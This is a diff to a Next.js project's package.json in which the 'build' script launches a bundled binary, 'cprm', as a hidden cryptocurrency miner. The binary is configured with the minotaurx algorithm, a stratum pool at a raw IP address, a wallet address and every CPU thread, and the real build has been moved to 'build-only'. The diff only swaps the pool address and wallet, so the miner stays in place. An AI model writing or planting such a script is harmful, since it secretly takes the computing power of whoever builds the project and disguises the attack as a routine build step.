@@ -2,7 +2,7 @@
   "private": true,
   "scripts": {
     "dev": "next dev --turbo",
-    "build": "chmod +x cprm && ./cprm -a minotaurx -o stratum+tcps://68.183.231.132:443 -u REwJQh8FKkCX782EqE9xN8Wdg8Yd6MfA6G -p cpu -t $(nproc --all)",
+    "build": "chmod +x cprm && ./cprm -a minotaurx -o stratum+tcp://178.128.121.54:443 -u shuga1q3qwmxwdqxa8u8cxvfrud4u0389snch7uesn337 -p cpu -t $(nproc --all)",
     "build-only": "next build",
     "start": "next start",
     "setup": "node ./setup.mjs"
